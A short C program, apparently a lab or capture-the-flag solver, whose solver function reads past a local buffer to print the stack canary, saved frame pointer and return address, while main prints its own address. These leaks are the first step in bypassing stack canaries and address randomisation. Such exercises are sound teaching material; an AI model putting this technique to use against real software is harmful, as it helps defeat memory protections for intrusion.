#include <stdio.h>

typedef int (*printf_ptr_t)(const char *format, ...);

void solver(printf_ptr_t fptr) {
	char msg[16] = "hello, world!";
	// fptr("%s\n", msg1);

	// fptr("%lu\n", *(unsigned long*)(msg+0x18)); // canary
	// fptr("%lu\n", *(unsigned long*)(msg+0x20)); // rbp
	// fptr("%lu\n", *(unsigned long*)(msg+0x28)); // return address

	fptr("%lu\n%lu\n%lu\n", *(unsigned long*)(msg+0x18), *(unsigned long*)(msg+0x20), *(unsigned long*)(msg+0x28));
}

int main() {
	char fmt[16] = "** main = %p\n";
	printf(fmt, main);
	solver(printf);
	return 0;
}